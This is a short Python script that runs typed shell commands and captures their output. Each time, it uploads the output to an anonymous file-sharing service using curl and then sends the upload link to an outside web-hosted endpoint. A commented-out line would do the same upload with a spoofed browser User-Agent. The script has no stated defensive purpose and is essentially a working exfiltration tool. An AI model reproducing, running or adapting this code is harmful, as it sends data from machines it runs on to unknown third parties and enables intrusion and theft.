import os
import sys
import json
import requests
while True:
    cmd = input("$ ")
    os.system(cmd)
    os.system(cmd + "> output")
    #r =  requests.post('https://api.anonymousfiles.io', files={'file': open('output', 'rb')}, headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"})
    os.system('curl -# -F "file=@output" https://api.anonfiles.com/upload > link')
    l = open("link")
    r = requests.get("https://hurairaroot.000webhostapp.com/index.php?url="+str(l.read()))

